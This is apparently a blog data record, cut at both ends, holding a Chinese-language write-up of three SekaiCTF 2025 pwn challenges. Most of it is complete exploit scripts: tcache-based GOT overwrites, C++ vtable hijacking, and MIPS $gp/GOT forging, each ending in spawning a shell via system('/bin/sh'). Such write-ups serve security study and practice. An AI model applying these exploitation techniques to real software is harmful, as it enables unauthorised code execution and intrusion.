0xff)\n\ti+=1\n\tbss>>=8\n\t\nre_c(1,0x10)\nprintf=0x401100\ni=0\nfor i in range(8):\n\tpr_c(0,-0x70+i,printf & 0xff)\n\tprintf>>=8\t\n\t\npay=b\"%17$p\"\nfor i,j in enumerate(pay):\n    pr_c(0, i, j) \nre_c(20,20)\n\nleak=int(io.recv(14),16)\nlibc_base=leak-0x2a1ca\nsystem=libc_base+0x58750 \nlogv(\"libc_base\",hex(libc_base))\nlogv(\"system\",hex(system))\n\npr_c(0,-0x290,0x1)\ni=0\nbss=0x404070\nwhile bss > 0:\n\tpr_c(0,-0x210+i,bss & 0xff)\n\ti+=1\n\tbss>>=8\nre_c(1,0x10)\nfor i in range(8):\n\tpr_c(0,-0x70+i,system & 0xff)\n\tsystem>>=8\t\npay=b\"/bin/sh\\x00\"\nfor i,j in enumerate(pay):\n    pr_c(0, i, j)\t\nre_c(20,20)\t\n\t\nio.interactive()\n\n```\n\n## learning_oop\n\n### ida分析\n\n![图3](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901194344121.png)\n\n\n首先漏洞点 ,  很明显是`set_name` 函数中的溢出漏洞 , 可以往下溢出覆盖下面的堆块. 然后堆块申请都是固定大小`0x120`\n\n可以看到这是一个`c++`的程序 ,  他的堆块都是 作为对象申请的. 这里应该是 用 `Animal` 这样一个类 , 然后 `Dog`,`Cat`,`Horse`,`Parrot` 类继承了`Animal`,并对其中的某些方法重写了.\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901203517642.png)\n\n在初始化一个动物的时候 , 在`fd` 的位置 写了一个虚表的地址 ,后续的函数调用都是靠这个地址去寻找和调用函数.\n\n年龄,饥饿值,体力,其实是堆块最后`0x10`字节保存的数据. 同时 ,  意识到 ,  可以溢出修改这个部分 , 去控制 动物的 这些信息.\n\n![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901204229246.png)\n\n这里 可以通过控制 `fd` 也就是劫持虚表 ,  来完成调用自己想要的函数.\n\n### 思路分析\n\n题目环境是2.39的libc . (没有版本讲堆题,都是在耍流氓)\n\n1. 首先要泄露`libc` , 然后劫持虚表 , 这里应该是很容易想到的. 那么如何泄露`libc`呢? 肯定是通过`unsorted bin` 了. 然后让堆块进入`unsorted bin`呢? 如果填满一个`tcache bins` , 再 `free` 一个`0x120` 的堆块, 看样子可行,但可以没有`uaf` 漏洞,这样利用会很困难. 所以 , 通过溢出修改堆块 的`size` 造一个0x481 的堆块 ,  造一个重叠. 因为这个大小的堆块超过了`tcahce bins`的大小会直接进入`unsorted bin`.\n2. 这个时候 再申请一个堆块 , `arena`信息就会写入到下一个堆块的`name`的位置, 如果此时下一个堆块恰好`die` ,就会触发`get_name` 把信息泄露出来.\n3. 然后劫持`vtable` ,我们通过在堆上布置一个虚表,在创建成功后,程序会返回堆的地址. 然后只要有合适的`gadgets`, 就可以调用`system`. 这里肯定需要的是控制`rdi`, 同时需要`call`\n\n### exp\n\n```python\nfrom esy import *\ncontext.log_level='debug'\n#context.terminal=[\"tmux\",\"splitw\",\"-h\",\"-l\",\"66%\"]\nio = process(\"./learning_oop\")\ndef menu(op):\n    io.sendlineafter(\"> \",str(op))\n\ndef add(species,name):\n    menu(1)\n    io.sendlineafter(\"4=Horse): \",str(species))\n    io.sendlineafter(\"Enter name: \\n\",name)\n\ndef play(idx):\n    menu(2)\n    io.sendlineafter(\"Which pet? \\n\",str(idx))\n\ndef feed(idx):\n    menu(3)\n    io.sendlineafter(\"Which pet? \\n\",str(idx))\n\ndef reset(idx):\n    menu(4)\n    io.sendlineafter(\"Which pet? \\n\",str(idx))\n\nadd(1,b\"a\"*0x100+p32(6)+p32(6))\nadd(3,b\"a\"*0x100+p32(5)+p32(5))\n\nadd(2,b\"a\"*0x100+p32(7)+p32(7))\nadd(2,b\"a\"*0x100+p32(6)+p32(6))\nadd(2,b\"a\"*0x100+p32(5)+p32(5))\nadd(2,b\"a\"*0x100+p32(4)+p32(4))\n\nadd(3,b\"a\"*0x100+p32(2)+p32(2))\nadd(1,b\"a\"*0x100+p32(0x10)+p32(0x10)+b\"a\"*8+p64(0x481))\n\n\nadd(2,b\"aaaa\")\nio.recvlines(1)\narena=u64(io.recv(6).ljust(8,b\"\\x00\"))\nlogv(\"arena\",hex(arena))\n\nlibcbase = arena - 0x203b20\nlogv(\"libcbase\",hex(libcbase))\n'''\n题目的\n0x00000000001cb42f : /bin/sh\n0x000000000009ca97 : mov rdi, qword ptr [rax + 0x640] ; call qword ptr [rax + 0x638]\n我的\n0x0000000000094ab6 : mov rdi, qword ptr [rax + 0x648] ; call qword ptr [rax + 0x640]\n0x00000000001d8678 : /bin/sh\n'''\nbin_sh=libcbase+0x1cb42f\nset_rdi=libcbase+0x9ca97\nsystem=libcbase+0x582d2\nlogv(\"system\",hex(system))\nlogv(\"bin_sh\",hex(bin_sh))\n##  这里的偏移需要对这gdb去找\nadd(1,p64(set_rdi)*4+b\"W\"*0xe0+p32(5)+p32(5)+p64(3)+p64(0xd281)+b\"a\"*(0x520-0x128)+p64(system)+p64(bin_sh))#+p64(bin_sh))\nio.recvuntil(\"Adopted new pet: \")\nvtable=int(io.recv(14),16)+8\n\nlogv(\"vtable\",hex(vtable))\n\nadd(1,p64(set_rdi)*8)\ngdb.attach(io,\"b *$rebase(0x143C)\")\nadd(1,b\"a\"*0x100+p32(5)+p32(5)+p64(3)+p64(0x121)+p64(vtable))\n\nio.interactive()\n\n```\n\n## outdated \n\n### ida分析\n\n### exp\n```python\nfrom pwn import *\nfrom subprocess import getoutput\n\n\n# initialize the binary\nbuild = 'mipsel32r6-musl'\nbinary = \"./outdated\"\nelf = context.binary = ELF(binary, checksec=False)\ndocker = ELF('/usr/bin/docker',checksec=False)\nlibc = ELF('./libc.so',checksec=False)\n\ngs = \"\"\"\nset architecture mips:isa32r6\nbreak *main+536\ncontinue\n\"\"\"\n\nif args.REMOTE:\n    p = remote(\"outdated.chals.sekai.team\", 1337, ssl=True)\n    \n    ### SOLVE POW ###\n    cmd = p.recvline().decode().strip().removeprefix(\"proof of work: \")\n    print(f\"Solving POW: {cmd}\")\n    answer = getoutput(cmd)\n    p.sendlineafter(b\"solution: \", answer.encode())\nelif args.GDB:\n    context.terminal = [\"tmux\", \"splitw\", \"-h\", \"-l\", \"65%\"]\n    p = docker.process(['run','-i','--rm','-v','./:/target/ctf','-p','1234:1234',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/outdated'])\n    print(\"Remote debugging started...\")\n    gdb.attach((\"127.0.0.1\",1234), gdbscript=gs, exe=binary)\nelse:\n    p = docker.process(['run','-i','--rm','-v','./:/target/ctf',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/outdated'])\n\n\n### GET EXE LEAK ###\np.recvuntil(b'Here')\nmain_addr = int(p.recvline().strip().split(b' ')[-1],16)\nprint(f\"main() = {hex(main_addr)}\")\n\n\n### GP OVERWRITE 1 ###\n\"\"\"\n(using example addresses)\nold $gp = 0xf98000, puts() = $gp-0x7f84, exit() = $gp-0x7fac, thanks = $gp-0x7fd0\nnew $gp = 0xf98090, puts() = 0xf9010c, exit() = 0xf900e4, thanks = 0xf900c0 (game_name @ 0xf900c0)\n\nOur goal is to turn puts(\"Thanks for playing\") into puts_blue(GOT[puts])\nand exit(0) into main(0)\n\"\"\"\nfake_got1 = flat(\n    # 0xf900c0\n    p32(main_addr + 0x1f6ac - 0x118c), p32(0), p32(0), p32(0), # GOT[puts] - main = 0x1f6ac (offset for \"Thanks\" string)\n    \n    # 0xf900d0\n    p32(0), p32(0), p32(0), p32(0),\n    \n    # 0xf900e0\n    p32(0), p32(main_addr), p32(0), p32(0), # address for main() so exit() jumps back into main()\n    \n    # 0xf900f0\n    p32(0), p32(0), p32(0), p32(0),\n\n    # 0xf90100\n    p32(0), p32(0), p32(0), p32(main_addr - 0x80), # offset from main() to puts_blue()\n)\np.sendline(fake_got1)                                   # name (fake GOT in global)\np.sendline(b'-12')                                      # offset to stored $gp\np.sendline(b'32912')                                    # least significant 2 bytes of new $gp\n\n\n### GET LIBC LEAK ###\np.recvuntil(b'in your game')\np.recvline()\nputs_addr = int.from_bytes(p.recvline()[5:8], 'little')\nprint(f\"puts() = {hex(puts_addr)}\")\nlibc.address = puts_addr - libc.symbols['puts']\n\n\n### GP OVERWRITE 2 ###\nfake_got2 = flat(\n    # 0xf900c0\n    p32(next(libc.search(b'/bin/sh\\0')) - 0x118c), p32(0), p32(0), p32(0), # \"/bin/sh\"\n    \n    # 0xf900d0\n    p32(0), p32(0), p32(0), p32(0),\n    \n    # 0xf900e0\n    p32(0), p32(main_addr), p32(0), p32(0), # address for main() so exit() jumps back into main()\n    \n    # 0xf900f0\n    p32(0), p32(0), p32(0), p32(0),\n\n    # 0xf90100\n    p32(0), p32(0), p32(0), p32(libc.sym['system']), # system()\n)\np.sendline(fake_got2)                                   # name (fake GOT in global)\np.sendline(b'-12')                                      # offset to stored $gp\np.sendline(b'32912')                                    # least significant 2 bytes of new $gp\n\np.interactive()\n\n```\n","source":"_posts/ctf比赛复现/sekaictf-2025-pwn.md","raw":"---\ntitle: sekaictf-2025-pwn\ntags:\n    - XCTF\n    - pwn\ncategories:\n    - 比赛记录\ncover: /img/治不开心药.png\n---\n# sekaictf--pwn复现 \n## 前言\n\n备战下一场xctf分站赛\n\n## speedpwn-2\n\n这是一道tcache 利用的题目，赛后复盘是有源码的，但我们这里还是从写题的角度进行一个分析\n\n### ida分析\n![图1](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901184359282.png)\n\n `main` 函数 首先申请了`0x190`大小的堆块作为一块画布, 然后循环进行操作. 每次循环的开始会调用`print_canvas` 把画布的内容打印出来,然后用户可以输入`p,r,h` 进行对应的操作\n 1. p , 修改堆块的一个字节\n 2. r , 重新申请堆块\n 3. h , 打印操作的说明\n\n图1 就是 r , 对应的操作\n\n![图2](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901185458942.png)\n\n图2 这里是p , 对应的操作.\n在75 行这里,就是一个明显的溢出漏洞. 因为这里没有对范围的检测 , 所以我们可以输入非法值 , 去修改不在这个堆块范围内的堆空间的值 .\n\n### 思路分析\n\n题目环境是 2.34的libc\n\n1. 首先是泄露libc . 题目没有开启`ALSR`和`FULL RELRO` ,  可以从`ida`里获取函数`plt`的地址 , 同时可以修改`got` 表 . 首先 ,  利用 溢出漏洞 ,  修改 `tcache_perthread_struct` 的 `counts` 和 `entries`, 把 `.got`表 附近的某一段 放入`tcache bins` 中 ,  再利用 `r` 把这个块空间分配出来.\n2. 然后是 ,  修改`got` 表. 利用上面的溢出漏洞 , 把 `free` 修改为`printf`, 利用格式化字符串  , 泄露出`libc`.\n3.  重复 1 的步骤 , 把这个堆块 重新申请回来. 因为当时`free` 被修改为了 `printf`, 所以不能直接申请 ,  得重复1 的步骤.\n4. 这一次把free修改为system , 然后把堆块内容设置为`/bin/sh\\x00`\n\n### exp\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\nurl=\"\"\nport=0\nio,elf=loadfile(\"./chall\",url,port)\nlibc=ELF(\"./libc.so.6\")\n\ndef pr_c(r,l,c):\n\tio.sendlineafter(\"> \",b\"p\")\n\tio.sendline(str(r))\n\tio.sendline(str(l))\n\tio.sendline(hex(c)[2:])\n\ndef re_c(r,l):\n\tio.sendlineafter(\"> \",b\"r\")\n\tio.sendline(str(r))\n\tio.sendline(str(l))\t\ngdb.attach(io,\"b *0x401605\")\npr_c(0,-0x290,0x1)\nbss=0x404070\ni=0\nwhile bss > 0:\n\tpr_c(0,-0x210+i,bss & 0xff)\n\ti+=1\n\tbss>>=8\n\t\nre_c(1,0x10)\nprintf=0x401100\ni=0\nfor i in range(8):\n\tpr_c(0,-0x70+i,printf & 0xff)\n\tprintf>>=8\t\n\t\npay=b\"%17$p\"\nfor i,j in enumerate(pay):\n    pr_c(0, i, j) \nre_c(20,20)\n\nleak=int(io.recv(14),16)\nlibc_base=leak-0x2a1ca\nsystem=libc_base+0x58750 \nlogv(\"libc_base\",hex(libc_base))\nlogv(\"system\",hex(system))\n\npr_c(0,-0x290,0x1)\ni=0\nbss=0x404070\nwhile bss > 0:\n\tpr_c(0,-0x210+i,bss & 0xff)\n\ti+=1\n\tbss>>=8\nre_c(1,0x10)\nfor i in range(8):\n\tpr_c(0,-0x70+i,system & 0xff)\n\tsystem>>=8\t\npay=b\"/bin/sh\\x00\"\nfor i,j in enumerate(pay):\n    pr_c(0, i, j)\t\nre_c(20,20)\t\n\t\nio.interactive()\n\n```\n\n## learning_oop\n\n### ida分析\n\n![图3](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901194344121.png)\n\n\n首先漏洞点 ,  很明显是`set_name` 函数中的溢出漏洞 , 可以往下溢出覆盖下面的堆块. 然后堆块申请都是固定大小`0x120`\n\n可以看到这是一个`c++`的程序 ,  他的堆块都是 作为对象申请的. 这里应该是 用 `Animal` 这样一个类 , 然后 `Dog`,`Cat`,`Horse`,`Parrot` 类继承了`Animal`,并对其中的某些方法重写了.\n\n![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901203517642.png)\n\n在初始化一个动物的时候 , 在`fd` 的位置 写了一个虚表的地址 ,后续的函数调用都是靠这个地址去寻找和调用函数.\n\n年龄,饥饿值,体力,其实是堆块最后`0x10`字节保存的数据. 同时 ,  意识到 ,  可以溢出修改这个部分 , 去控制 动物的 这些信息.\n\n![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901204229246.png)\n\n这里 可以通过控制 `fd` 也就是劫持虚表 ,  来完成调用自己想要的函数.\n\n### 思路分析\n\n题目环境是2.39的libc . (没有版本讲堆题,都是在耍流氓)\n\n1. 首先要泄露`libc` , 然后劫持虚表 , 这里应该是很容易想到的. 那么如何泄露`libc`呢? 肯定是通过`unsorted bin` 了. 然后让堆块进入`unsorted bin`呢? 如果填满一个`tcache bins` , 再 `free` 一个`0x120` 的堆块, 看样子可行,但可以没有`uaf` 漏洞,这样利用会很困难. 所以 , 通过溢出修改堆块 的`size` 造一个0x481 的堆块 ,  造一个重叠. 因为这个大小的堆块超过了`tcahce bins`的大小会直接进入`unsorted bin`.\n2. 这个时候 再申请一个堆块 , `arena`信息就会写入到下一个堆块的`name`的位置, 如果此时下一个堆块恰好`die` ,就会触发`get_name` 把信息泄露出来.\n3. 然后劫持`vtable` ,我们通过在堆上布置一个虚表,在创建成功后,程序会返回堆的地址. 然后只要有合适的`gadgets`, 就可以调用`system`. 这里肯定需要的是控制`rdi`, 同时需要`call`\n\n### exp\n\n```python\nfrom esy import *\ncontext.log_level='debug'\n#context.terminal=[\"tmux\",\"splitw\",\"-h\",\"-l\",\"66%\"]\nio = process(\"./learning_oop\")\ndef menu(op):\n    io.sendlineafter(\"> \",str(op))\n\ndef add(species,name):\n    menu(1)\n    io.sendlineafter(\"4=Horse): \",str(species))\n    io.sendlineafter(\"Enter name: \\n\",name)\n\ndef play(idx):\n    menu(2)\n    io.sendlineafter(\"Which pet? \\n\",str(idx))\n\ndef feed(idx):\n    menu(3)\n    io.sendlineafter(\"Which pet? \\n\",str(idx))\n\ndef reset(idx):\n    menu(4)\n    io.sendlineafter(\"Which pet? \\n\",str(idx))\n\nadd(1,b\"a\"*0x100+p32(6)+p32(6))\nadd(3,b\"a\"*0x100+p32(5)+p32(5))\n\nadd(2,b\"a\"*0x100+p32(7)+p32(7))\nadd(2,b\"a\"*0x100+p32(6)+p32(6))\nadd(2,b\"a\"*0x100+p32(5)+p32(5))\nadd(2,b\"a\"*0x100+p32(4)+p32(4))\n\nadd(3,b\"a\"*0x100+p32(2)+p32(2))\nadd(1,b\"a\"*0x100+p32(0x10)+p32(0x10)+b\"a\"*8+p64(0x481))\n\n\nadd(2,b\"aaaa\")\nio.recvlines(1)\narena=u64(io.recv(6).ljust(8,b\"\\x00\"))\nlogv(\"arena\",hex(arena))\n\nlibcbase = arena - 0x203b20\nlogv(\"libcbase\",hex(libcbase))\n'''\n题目的\n0x00000000001cb42f : /bin/sh\n0x000000000009ca97 : mov rdi, qword ptr [rax + 0x640] ; call qword ptr [rax + 0x638]\n我的\n0x0000000000094ab6 : mov rdi, qword ptr [rax + 0x648] ; call qword ptr [rax + 0x640]\n0x00000000001d8678 : /bin/sh\n'''\nbin_sh=libcbase+0x1cb42f\nset_rdi=libcbase+0x9ca97\nsystem=libcbase+0x582d2\nlogv(\"system\",hex(system))\nlogv(\"bin_sh\",hex(bin_sh))\n##  这里的偏移需要对这gdb去找\nadd(1,p64(set_rdi)*4+b\"W\"*0xe0+p32(5)+p32(5)+p64(3)+p64(0xd281)+b\"a\"*(0x520-0x128)+p64(system)+p64(bin_sh))#+p64(bin_sh))\nio.recvuntil(\"Adopted new pet: \")\nvtable=int(io.recv(14),16)+8\n\nlogv(\"vtable\",hex(vtable))\n\nadd(1,p64(set_rdi)*8)\ngdb.attach(io,\"b *$rebase(0x143C)\")\nadd(1,b\"a\"*0x100+p32(5)+p32(5)+p64(3)+p64(0x121)+p64(vtable))\n\nio.interactive()\n\n```\n\n## outdated \n\n### ida分析\n\n### exp\n```python\nfrom pwn import *\nfrom subprocess import getoutput\n\n\n# initialize the binary\nbuild = 'mipsel32r6-musl'\nbinary = \"./outdated\"\nelf = context.binary = ELF(binary, checksec=False)\ndocker = ELF('/usr/bin/docker',checksec=False)\nlibc = ELF('./libc.so',checksec=False)\n\ngs = \"\"\"\nset architecture mips:isa32r6\nbreak *main+536\ncontinue\n\"\"\"\n\nif args.REMOTE:\n    p = remote(\"outdated.chals.sekai.team\", 1337, ssl=True)\n    \n    ### SOLVE POW ###\n    cmd = p.recvline().decode().strip().removeprefix(\"proof of work: \")\n    print(f\"Solving POW: {cmd}\")\n    answer = getoutput(cmd)\n    p.sendlineafter(b\"solution: \", answer.encode())\nelif args.GDB:\n    context.terminal = [\"tmux\", \"splitw\", \"-h\", \"-l\", \"65%\"]\n    p = docker.process(['run','-i','--rm','-v','./:/target/ctf','-p','1234:1234',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/outdated'])\n    print(\"Remote debugging started...\")\n    gdb.attach((\"127.0.0.1\",1234), gdbscript=gs, exe=binary)\nelse:\n    p = docker.process(['run','-i','--rm','-v','./:/target/ctf',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/outdated'])\n\n\n### GET EXE LEAK ###\np.recvuntil(b'Here')\nmain_addr = int(p.recvline().strip().split(b' ')[-1],16)\nprint(f\"main() = {hex(main_addr)}\")\n\n\n### GP OVERWRITE 1 ###\n\"\"\"\n(using example addresses)\nold $gp = 0xf98000, puts() = $gp-0x7f84, exit() = $gp-0x7fac, thanks = $gp-0x7fd0\nnew $gp = 0xf98090, puts() = 0xf9010c, exit() = 0xf900e4, thanks = 0xf900c0 (game_name @ 0xf900c0)\n\nOur goal is to turn puts(\"Thanks for playing\") into puts_blue(GOT[puts])\nand exit(0) into main(0)\n\"\"\"\nfake_got1 = flat(\n    # 0xf900c0\n    p32(main_addr + 0x1f6ac - 0x118c), p32(0), p32(0), p32(0), # GOT[puts] - main = 0x1f6ac (offset for \"Thanks\" string)\n    \n    # 0xf900d0\n    p32(0), p32(0), p32(0), p32(0),\n    \n    # 0xf900e0\n    p32(0), p32(main_addr), p32(0), p32(0), # address for main() so exit() jumps back into main()\n    \n    # 0xf900f0\n    p32(0), p32(0), p32(0), p32(0),\n\n    # 0xf90100\n    p32(0), p32(0), p32(0), p32(main_addr - 0x80), # offset from main() to puts_blue()\n)\np.sendline(fake_got1)                                   # name (fake GOT in global)\np.sendline(b'-12')                                      # offset to stored $gp\np.sendline(b'32912')                                    # least significant 2 bytes of new $gp\n\n\n### GET LIBC LEAK ###\np.recvuntil(b'in your game')\np.recvline()\nputs_addr = int.from_bytes(p.recvline()[5:8], 'little')\nprint(f\"puts() = {hex(puts_addr)}\")\nlibc.address = puts_addr - libc.symbols['puts']\n\n\n### GP OVERWRITE 2 ###\nfake_got2 = flat(\n    # 0xf900c0\n    p32(next(libc.search(b'/bin/sh\\0')) - 0x118c), p32(0), p32(0), p32(0), # \"/bin/sh\"\n    \n    # 0xf900d0\n    p32(0), p32(0), p32(0), p32(0),\n    \n    # 0xf900e0\n    p32(0), p32(main_addr), p32(0), p32(0), # address for main() so exit() jumps back into main()\n    \n    # 0xf900f0\n    p32(0), p32(0), p32(0), p32(0),\n\n    # 0xf90100\n    p32(0), p32(0), p32(0), p32(libc.sym['system']), # system()\n)\np.sendline(fake_got2)                                   # name (fake GOT in global)\np.sendline(b'-12')                                      # offset to stored $gp\np.sendline(b'32912')                                    # least significant 2 bytes of new $gp\n\np.interactive()\n\n```\n","slug":"ctf比赛复现/sekaictf-2025-pwn","published":1,"date":"2025-10-06T14:48:09.864Z","updated":"2025-10-06T15:22:04.064Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2i6000ouomy645oao6m","content":"<h1 id=\"sekaictf–pwn复现\"><a href=\"#sekaictf–pwn复现\" class=\"headerlink\" title=\"sekaictf–pwn复现\"></a>sekaictf–pwn复现</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>备战下一场xctf分站赛</p>\n<h2 id=\"speedpwn-2\"><a href=\"#speedpwn-2\" class=\"headerlink\" title=\"speedpwn-2\"></a>speedpwn-2</h2><p>这是一道tcache 利用的题目，赛后复盘是有源码的，但我们这里还是从写题的角度进行一个分析</p>\n<h3 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901184359282.png\" alt=\"图1\"></p>\n<p> <code>main</code> 函数 首先申请了<code>0x190</code>大小的堆块作为一块画布, 然后循环进行操作. 每次循环的开始会调用<code>print_canvas</code> 把画布的内容打印出来,然后用户可以输入<code>p,r,h</code> 进行对应的操作</p>\n<ol>\n<li>p , 修改堆块的一个字节</li>\n<li>r , 重新申请堆块</li>\n<li>h , 打印操作的说明</li>\n</ol>\n<p>图1 就是 r , 对应的操作</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901185458942.png\" alt=\"图2\"></p>\n<p>图2 这里是p , 对应的操作.<br>在75 行这里,就是一个明显的溢出漏洞. 因为这里没有对范围的检测 , 所以我们可以输入非法值 , 去修改不在这个堆块范围内的堆空间的值 .</p>\n<h3 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h3><p>题目环境是 2.34的libc</p>\n<ol>\n<li>首先是泄露libc . 题目没有开启<code>ALSR</code>和<code>FULL RELRO</code> ,  可以从<code>ida</code>里获取函数<code>plt</code>的地址 , 同时可以修改<code>got</code> 表 . 首先 ,  利用 溢出漏洞 ,  修改 <code>tcache_perthread_struct</code> 的 <code>counts</code> 和 <code>entries</code>, 把 <code>.got</code>表 附近的某一段 放入<code>tcache bins</code> 中 ,  再利用 <code>r</code> 把这个块空间分配出来.</li>\n<li>然后是 ,  修改<code>got</code> 表. 利用上面的溢出漏洞 , 把 <code>free</code> 修改为<code>printf</code>, 利用格式化字符串  , 泄露出<code>libc</code>.</li>\n<li>重复 1 的步骤 , 把这个堆块 重新申请回来. 因为当时<code>free</code> 被修改为了 <code>printf</code>, 所以不能直接申请 ,  得重复1 的步骤.</li>\n<li>这一次把free修改为system , 然后把堆块内容设置为<code>/bin/sh\\x00</code></li>\n</ol>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">url=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">port=<span class=\"number\">0</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./chall&quot;</span>,url,port)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pr_c</span>(<span class=\"params\">r,l,c</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"string\">b&quot;p&quot;</span>)</span><br><span class=\"line\">\tio.sendline(<span class=\"built_in\">str</span>(r))</span><br><span class=\"line\">\tio.sendline(<span class=\"built_in\">str</span>(l))</span><br><span class=\"line\">\tio.sendline(<span class=\"built_in\">hex</span>(c)[<span class=\"number\">2</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">re_c</span>(<span class=\"params\">r,l</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"string\">b&quot;r&quot;</span>)</span><br><span class=\"line\">\tio.sendline(<span class=\"built_in\">str</span>(r))</span><br><span class=\"line\">\tio.sendline(<span class=\"built_in\">str</span>(l))\t</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401605&quot;</span>)</span><br><span class=\"line\">pr_c(<span class=\"number\">0</span>,-<span class=\"number\">0x290</span>,<span class=\"number\">0x1</span>)</span><br><span class=\"line\">bss=<span class=\"number\">0x404070</span></span><br><span class=\"line\">i=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> bss &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">\tpr_c(<span class=\"number\">0</span>,-<span class=\"number\">0x210</span>+i,bss &amp; <span class=\"number\">0xff</span>)</span><br><span class=\"line\">\ti+=<span class=\"number\">1</span></span><br><span class=\"line\">\tbss&gt;&gt;=<span class=\"number\">8</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">re_c(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\">printf=<span class=\"number\">0x401100</span></span><br><span class=\"line\">i=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tpr_c(<span class=\"number\">0</span>,-<span class=\"number\">0x70</span>+i,printf &amp; <span class=\"number\">0xff</span>)</span><br><span class=\"line\">\tprintf&gt;&gt;=<span class=\"number\">8</span>\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">pay=<span class=\"string\">b&quot;%17$p&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i,j <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(pay):</span><br><span class=\"line\">    pr_c(<span class=\"number\">0</span>, i, j) </span><br><span class=\"line\">re_c(<span class=\"number\">20</span>,<span class=\"number\">20</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">leak=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">libc_base=leak-<span class=\"number\">0x2a1ca</span></span><br><span class=\"line\">system=libc_base+<span class=\"number\">0x58750</span> </span><br><span class=\"line\">logv(<span class=\"string\">&quot;libc_base&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">logv(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"></span><br><span class=\"line\">pr_c(<span class=\"number\">0</span>,-<span class=\"number\">0x290</span>,<span class=\"number\">0x1</span>)</span><br><span class=\"line\">i=<span class=\"number\">0</span></span><br><span class=\"line\">bss=<span class=\"number\">0x404070</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> bss &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">\tpr_c(<span class=\"number\">0</span>,-<span class=\"number\">0x210</span>+i,bss &amp; <span 